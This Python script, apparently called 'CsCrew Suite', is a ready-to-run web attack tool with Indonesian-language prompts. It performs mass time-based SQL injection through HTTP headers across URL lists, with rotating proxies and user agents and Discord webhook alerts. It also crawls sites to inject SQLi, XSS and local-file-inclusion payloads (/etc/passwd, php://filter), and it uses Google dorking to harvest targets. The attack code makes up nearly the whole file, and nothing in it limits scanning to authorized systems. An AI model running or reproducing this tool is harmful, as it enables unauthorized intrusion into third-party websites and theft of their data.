#!/usr/bin/env python3
import requests
import time
import random
import urllib3
import os
import asyncio
import aiohttp
import sys
import json
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from pyfiglet import Figlet
from googlesearch import search

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global configs
DISCORD_WEBHOOK = ""
PROXIES_LIST = [
    # "http://127.0.0.1:8080",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.1 Safari/537.78.2",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0"
]

def random_user_agent():
    return random.choice(USER_AGENTS)

def get_random_proxy():
    if PROXIES_LIST:
        proxy = random.choice(PROXIES_LIST)
        return {"http": proxy, "https": proxy}
    return None

def print_banner():
    f = Figlet(font='slant')
    banner = f.renderText('CsCrew Suite')
    print(Fore.RED + banner + Style.RESET_ALL)
    print(Fore.WHITE + "▐▐ CsCrew Pentest Tools (created by adxxm)▐▐\n" + Style.RESET_ALL)

def print_menu():
    print(Fore.CYAN + "=" * 60)
    print("SECURITY TESTING SUITE - MAIN MENU")
    print("=" * 60 + Style.RESET_ALL)
    print("1. SQLi HS (Multi-Method)")
    print(Fore.GREEN + "2. Vuln Finder")
    print("3. SQLi Tester  + Test Op.4")
    print("4. Google Dorking")
    print("5. Exit" + Style.RESET_ALL)
    print(Fore.CYAN + "=" * 60 + Style.RESET_ALL)

# Option 1: SQL Injection Header Scanner
class SQLHeaderScanner:
    def __init__(self):
        self.payload = 'nvn"xor(if(now()=sysdate(),SLEEP(6),0))xor"nvn'
        self.base_headers = {
            "User-Agent": "normal-useragent",
            "X-Forwarded-For": "normal-xff",
            "X-Client-IP": "normal-clientip",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "*/*"
        }
        self.headers_to_test = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]
        self.methods_to_test = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "PATCH"]
        self.timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.output_file = f"vulnerable_endpoints_{self.timestamp}.txt"

    def send_discord_alert(self, url, method, header, attack_headers):
        if DISCORD_WEBHOOK:
            try:
                data = {
                    "content": f"🚨 SQLi Vulnerable\nURL: {url}\nMethod: {method}\nInjected Header: {header}\nAttack Headers:\n{chr(10).join(f'{k}: {v}' for k, v in attack_headers.items())}"
                }
                requests.post(DISCORD_WEBHOOK, json=data, proxies=get_random_proxy(), verify=False)
            except Exception as e:
                print(Fore.YELLOW + f"[!!] Discord alert failed: {str(e)}" + Style.RESET_ALL)

    def is_vulnerable(self, url, method, injected_header):
        try:
            headers = self.base_headers.copy()
            headers[injected_header] = self.payload
            headers["User-Agent"] = random_user_agent()
            proxies = get_random_proxy()
            target_url = url.rstrip('/') + "/admin/"

            start = time.time()
            if method == "GET":
                response = requests.get(target_url, headers=headers, timeout=10, verify=False, proxies=proxies)
            elif method == "POST":
                response = requests.post(target_url, headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=proxies)
            elif method == "PUT":
                response = requests.put(target_url, headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=proxies)
            elif method == "OPTIONS":
                response = requests.options(target_url, headers=headers, timeout=10, verify=False, proxies=proxies)
            elif method == "HEAD":
                response = requests.head(target_url, headers=headers, timeout=10, verify=False, proxies=proxies)
            elif method == "PATCH":
                response = requests.patch(target_url, headers=headers, data={"test": "test"}, timeout=10, verify=False, proxies=proxies)
            else:
                return False, None, None

            duration = time.time() - start
            return duration > 5.5, response.status_code, method
        except Exception:
            return False, None, method

    def run_scan(self, file_path):
        print(Fore.YELLOW + "\n[+] Starting SQL Injection Header Scanner..." + Style.RESET_ALL)

        with open(file_path, 'r') as f:
            raw_urls = [line.strip() for line in f if line.strip()]

        urls = []
        for line in raw_urls:
            if not line.startswith("http://") and not line.startswith("https://"):
                line = "https://" + line
            urls.append(line)

        random.shuffle(urls)
        print(f"\n[+] Loaded {len(urls)} targets. Starting scan...\n")

        for idx, url in enumerate(urls):
            print(f"\n[{idx + 1}/{len(urls)}] Testing: {url}")
            random.shuffle(self.methods_to_test)

            for method in self.methods_to_test:
                random.shuffle(self.headers_to_test)
                for header in self.headers_to_test:
                    print(f"  [*] Trying {method} with header {header}...")
                    vulnerable, status, used_method = self.is_vulnerable(url, method, header)

                    if vulnerable:
                        print(Fore.GREEN + f"  [!!] Vulnerable! {url} | Status: {status} | Method: {used_method} | Header: {header}" + Style.RESET_ALL)
                        with open(self.output_file, "a") as out:
                            out.write(f"{url} | {used_method} | {header}\n")
                            out.flush()
                            os.fsync(out.fileno())
                        self.send_discord_alert(url, used_method, header, self.base_headers)
                        break
                    else:
                        color = Fore.RED if status else Fore.YELLOW
                        print(color + f"  [--] Not vulnerable | Status: {status if status else 'Error/Timeout'}" + Style.RESET_ALL)
                    time.sleep(3)
                else:
                    continue
                break

        print(f"\n[+] Scan finished. Vulnerable results saved in: {self.output_file}\n")

# Option 2: Comprehensive Vulnerability Scanner (async)
class VulnScanner:
    def __init__(self, max_crawl=110, timeout=5, concurrent_scans=10, verbose=False):
        self.max_crawl = max_crawl
        self.timeout = timeout
        self.concurrent_scans = concurrent_scans
        self.verbose = verbose
        self.visited_urls = set()
        self.vulnerabilities = []
        self.scan_stats = {
            'urls_crawled': 0,
            'vulnerabilities_found': 0,
            'start_time': None,
            'end_time': None
        }

        self.payloads = {
            "sqli": [
                "' OR '1'='1", "' OR 1=1--", "\" OR \"\" = \"",
                "' OR EXISTS(SELECT * FROM users)--", "' UNION SELECT NULL--",
                "admin'--", "' OR 'a'='a", "1' OR '1'='1' #",
                "') OR ('1'='1", "1 OR 1=1", "' OR 1=1 LIMIT 1--"
            ],
            "xss": [
                "<script>alert(1)</script>", "'\"><script>alert(1)</script>",
                "<svg/onload=alert(1)>", "<img src=x onerror=alert(1)>",
                "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>", "<svg><script>alert(1)</script></svg>",
                "';alert(1);//", "<marquee onstart=alert(1)>"
            ],
            "lfi": [
                "../../../../etc/passwd", "/etc/passwd", "../../../../../proc/self/environ",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//....//etc/passwd", "/proc/version",
                "/etc/hosts", "../../../../../../etc/passwd%00",
                "php://filter/read=convert.base64-encode/resource=index.php"
            ]
        }

        self.error_patterns = {
            'sqli': [
                "you have an error in your sql syntax", "warning: mysql",
                "unclosed quotation mark", "quoted string not properly terminated",
                "mysql_fetch", "syntax error", "sql syntax", "ora-01756",
                "microsoft jet database", "sqlite_error", "postgresql error",
                "column count doesn't match", "syntax error near"
            ],
            'lfi': [
                "root:x:", "daemon:", "bin:", "sys:", "nobody:",
                "[boot loader]", "[fonts]", "for 16-bit app support"
            ]
        }

    def colored(self, text, color=Fore.WHITE):
        return color + text + Style.RESET_ALL

    def log_verbose(self, message):
        if self.verbose:
            print(self.colored(f"[DEBUG] {message}", Fore.BLUE))

    async def fetch_with_retry(self, session, url, retries=2):
        for attempt in range(retries + 1):
            try:
                headers = {
                    'User-Agent': random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                proxy = get_random_proxy()
                async with session.get(url, timeout=self.timeout, ssl=False,
                                     headers=headers, allow_redirects=True, proxy=proxy['http'] if proxy else None) as resp:
                    if "text/html" in resp.headers.get("Content-Type", ""):
                        content = await resp.text()
                        self.log_verbose(f"Successfully fetched: {url}")
                        return content, resp.status
                    return None, resp.status
            except asyncio.TimeoutError:
                self.log_verbose(f"Timeout for {url}, attempt {attempt + 1}")
                if attempt == retries:
                    return None, None
                await asyncio.sleep(1)
            except Exception as e:
                self.log_verbose(f"Error fetching {url}: {str(e)}")
                return None, None
        return None, None

    async def crawl_enhanced(self, session, base_url):
        queue = asyncio.Queue()
        await queue.put(base_url)
        self.visited_urls.add(base_url)
        forms_found = []

        print(self.colored(f"[+] Starting crawl of {base_url}", Fore.YELLOW))

        while not queue.empty() and len(self.visited_urls) < self.max_crawl:
            current_url = await queue.get()
            self.log_verbose(f"Crawling: {current_url}")

            html, status = await self.fetch_with_retry(session, current_url)
            if not html:
                continue

            soup = BeautifulSoup(html, "html.parser")

            # Extract links
            for tag in soup.find_all("a", href=True):
                href = tag.get("href")
                if href:
                    new_url = urljoin(base_url, href.split('#')[0])
                    if self.is_same_domain(base_url, new_url) and new_url not in self.visited_urls:
                        self.visited_urls.add(new_url)
                        if len(self.visited_urls) >= self.max_crawl:
                            break
                        await queue.put(new_url)

            # Extract forms
            for form in soup.find_all("form"):
                action = form.get("action", "")
                if action:
                    form_url = urljoin(base_url, action)
                    if self.is_same_domain(base_url, form_url):
                        forms_found.append({
                            'url': form_url,
                            'method': form.get('method', 'get').lower(),
                            'inputs': [inp.get('name') for inp in form.find_all('input', {'name': True})]
                        })

        self.scan_stats['urls_crawled'] = len(self.visited_urls)
        print(self.colored(f"[+] Crawl complete. Found {len(self.visited_urls)} URLs and {len(forms_found)} forms\n", Fore.YELLOW))
        return forms_found

    def is_same_domain(self, base_url, test_url):
        return urlparse(base_url).netloc == urlparse(test_url).netloc

    def inject_payload(self, url, param, payload):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if param not in qs:
            return url
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return parsed._replace(query=new_query).geturl()

    async def test_vulnerability(self, session, url, param, payload, vuln_type):
        test_url = self.inject_payload(url, param, payload)

        try:
            async with session.get(test_url, timeout=self.timeout, ssl=False) as resp:
                text = await resp.text()
                vulnerability_found = False

                if vuln_type.lower() == "sqli":
                    if any(error in text.lower() for error in self.error_patterns['sqli']):
                        vulnerability_found = True

                elif vuln_type.lower() == "xss":
                    if payload in text:
                        vulnerability_found = True

                elif vuln_type.lower() == "lfi":
                    if any(pattern in text.lower() for pattern in self.error_patterns['lfi']):
                        vulnerability_found = True

                if vulnerability_found:
                    vuln_info = {
                        'type': vuln_type,
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'timestamp': datetime.now().isoformat(),
                        'response_code': resp.status
                    }

                    msg = f"[{vuln_type}] {url} -> Parameter: {param}"
                    print(self.colored("  [!] " + msg, Fore.RED))
                    self.vulnerabilities.append(vuln_info)
                    self.scan_stats['vulnerabilities_found'] += 1
                    return True

        except Exception as e:
            self.log_verbose(f"Error testing {test_url}: {str(e)}")

        return False

    async def scan_url(self, session, url):
        parsed = urlparse(url)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)
        self.log_verbose(f"Scanning {url} with {len(params)} parameters")

        scan_tasks = []

        for param in params:
            for vuln_type, payload_list in self.payloads.items():
                for payload in payload_list:
                    task = self.test_vulnerability(session, url, param, payload, vuln_type)
                    scan_tasks.append(task)

        semaphore = asyncio.Semaphore(5)

        async def limited_scan(task):
            async with semaphore:
                return await task

        await asyncio.gather(*[limited_scan(task) for task in scan_tasks])

    async def run_scan(self, target_url, output_file):
        print(Fore.YELLOW + "\n[+] Starting Comprehensive Vulnerability Scanner..." + Style.RESET_ALL)
        self.scan_stats['start_time'] = datetime.now()

        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            forms = await self.crawl_enhanced(session, target_url)

            semaphore = asyncio.Semaphore(self.concurrent_scans)

            async def scan_with_limit(url):
                async with semaphore:
                    print(self.colored(f"[+] Scanning {url}", Fore.CYAN))
                    await self.scan_url(session, url)

            await asyncio.gather(*(scan_with_limit(url) for url in self.visited_urls))

        self.scan_stats['end_time'] = datetime.now()
        await self.save_results(output_file)
        self.print_summary()

    async def save_results(self, output_file):
        json_file = output_file.replace('.txt', '.json')
        report_data = {
            'scan_info': {
                'scan_date': self.scan_stats['start_time'].isoformat() if self.scan_stats['start_time'] else None,
                'duration': str(self.scan_stats['end_time'] - self.scan_stats['start_time']) if self.scan_stats['start_time'] and self.scan_stats['end_time'] else None,
                'urls_crawled': self.scan_stats['urls_crawled'],
                'vulnerabilities_found': self.scan_stats['vulnerabilities_found']
            },
            'vulnerabilities': self.vulnerabilities,
            'crawled_urls': list(self.visited_urls)
        }

        with open(json_file, 'w') as f:
            json.dump(report_data, f, indent=2)

        with open(output_file, 'w') as f:
            f.write(f"Comprehensive Web Pentest Report\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"URLs Scanned: {self.scan_stats['urls_crawled']}\n")
            f.write(f"Vulnerabilities Found: {self.scan_stats['vulnerabilities_found']}\n\n")

            for vuln in self.vulnerabilities:
                f.write(f"[{vuln['type']}] {vuln['url']} (Parameter: {vuln['parameter']})\n")
                f.write(f"  Payload: {vuln['payload']}\n")
                f.write(f"  Time: {vuln['timestamp']}\n\n")

    def print_summary(self):
        duration = self.scan_stats['end_time'] - self.scan_stats['start_time'] if self.scan_stats['start_time'] and self.scan_stats['end_time'] else None

        print("\n" + "="*60)
        print(self.colored("SCAN SUMMARY", Fore.YELLOW))
        print("="*60)
        print(f"URLs Crawled: {self.scan_stats['urls_crawled']}")
        print(f"Vulnerabilities Found: {self.scan_stats['vulnerabilities_found']}")
        if duration:
            print(f"Scan Duration: {duration}")

        if self.vulnerabilities:
            vuln_types = {}
            for vuln in self.vulnerabilities:
                vuln_type = vuln['type']
                vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1

            print("\nVulnerability Breakdown:")
            for vuln_type, count in vuln_types.items():
                print(f"  {vuln_type}: {count}")

        print(self.colored(f"\n[✓] Scan complete! Results saved to output files", Fore.GREEN))

# Option 3: Basic SQL Injection Tester with file or single URL input
class BasicSQLTester:
    def __init__(self):
        self.payloads = [
            "' OR 1=1 --",
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' OR 1=2 --",
            "' UNION SELECT NULL, NULL --",
            "'; SLEEP(5) --"
        ]

    def test_sql_injection(self, url):
        headers = {
            "User-Agent": random_user_agent()
        }

        print(Fore.CYAN + f"\n[+] Testing URL: {url}" + Style.RESET_ALL)

        for payload in self.payloads:
            test_url = url + payload
            print(Fore.YELLOW + f"  [*] Testing payload: {payload}" + Style.RESET_ALL)

            try:
                proxies = get_random_proxy()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False, proxies=proxies)
                if response.status_code == 200:
                    text_lower = response.text.lower()
                    if "error" in text_lower or "you have an error in your sql syntax" in text_lower:
                        print(Fore.GREEN + f"  [VULNERABLE] SQL injection detected with payload: {payload}" + Style.RESET_ALL)
                        return True
                    if "sleep" in text_lower:
                        print(Fore.GREEN + f"  [INFO] Detected time delay, possible time-based injection." + Style.RESET_ALL)
                        return True
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"  [ERROR] Request failed: {e}" + Style.RESET_ALL)
        print(Fore.RED + "  [!] No SQL injection vulnerability detected." + Style.RESET_ALL)
        return False

def option_sql_tester():
    print(Fore.CYAN + "\n[?] Pilih mode input URL:" + Style.RESET_ALL)
    print("1. Input satu URL")
    print("2. Input dari file (list URL)")

    choice = input(Fore.WHITE + "Pilih (1/2): " + Style.RESET_ALL).strip()

    tester = BasicSQLTester()

    if choice == '1':
        url = input(Fore.WHITE + "Masukkan URL: " + Style.RESET_ALL).strip()
        if url:
            tester.test_sql_injection(url)
        else:
            print(Fore.RED + "[!] URL tidak valid." + Style.RESET_ALL)

    elif choice == '2':
        file_path = input(Fore.WHITE + "Masukkan path file list URL: " + Style.RESET_ALL).strip()
        if os.path.isfile(file_path):
            with open(file_path, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            print(Fore.CYAN + f"[+] Membaca {len(urls)} URL dari file..." + Style.RESET_ALL)
            for url in urls:
                tester.test_sql_injection(url)
        else:
            print(Fore.RED + "[!] File tidak ditemukan." + Style.RESET_ALL)
    else:
        print(Fore.RED + "[!] Pilihan tidak valid." + Style.RESET_ALL)

# Option 4: Google Dorking
def google_dorking(query, num=10, pause=5):
    results = []
    try:
        for url in search(query, num=num*3, pause=pause):
            if len(results) >= num:
                break
            if url not in results:
                results.append(url)
    except Exception as e:
        print(Fore.RED + f"[!] Terjadi kesalahan saat melakukan pencarian: {e}" + Style.RESET_ALL)

    if len(results) < num:
        print(Fore.YELLOW + f"[!] Hanya ditemukan {len(results)} hasil." + Style.RESET_ALL)

    return results

def option_google_dorking():
    query = input("Masukkan Google dork query: ").strip()
    while True:
        try:
            num = int(input("Jumlah hasil yang ingin diambil (misal 10): ").strip())
            if num <= 0:
                print(Fore.RED + "[!] Masukkan angka positif." + Style.RESET_ALL)
                continue
            break
        except ValueError:
            print(Fore.RED + "[!] Input tidak valid, masukkan angka." + Style.RESET_ALL)

    results = google_dorking(query, num=num, pause=5)

    if results:
        output_file = "hasil_dork.txt"
        with open(output_file, "w") as f:
            for url in results:
                print(url)  # hanya URL tanpa teks tambahan
                f.write(url + "\n")
        print(Fore.YELLOW + f"[+] Hasil pencarian ({len(results)} URL) disimpan di {output_file}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[!] Tidak ada hasil yang ditemukan." + Style.RESET_ALL)

# Main program
def main():
    print_banner()

    while True:
        print_menu()
        choice = input(Fore.WHITE + "Pilih opsi (1-5): " + Style.RESET_ALL).strip()

        if choice == '1':
            file_path = input("Masukkan path file target (list URL): ").strip()
            if os.path.isfile(file_path):
                scanner = SQLHeaderScanner()
                scanner.run_scan(file_path)
            else:
                print(Fore.RED + "[!] File tidak ditemukan." + Style.RESET_ALL)

        elif choice == '2':
            target_url = input("Masukkan URL target untuk Vuln Finder: ").strip()
            if target_url:
                vuln_scanner = VulnScanner()
                asyncio.run(vuln_scanner.run_scan(target_url, "vuln_finder_results.txt"))
            else:
                print(Fore.RED + "[!] URL tidak valid." + Style.RESET_ALL)

        elif choice == '3':
            option_sql_tester()

        elif choice == '4':
            option_google_dorking()

        elif choice == '5':
            print(Fore.GREEN + "[✓] Terima kasih telah menggunakan CsCrew Suite. Keluar..." + Style.RESET_ALL)
            sys.exit(0)

        else:
            print(Fore.RED + "[!] Pilihan tidak valid. Silakan coba lagi." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
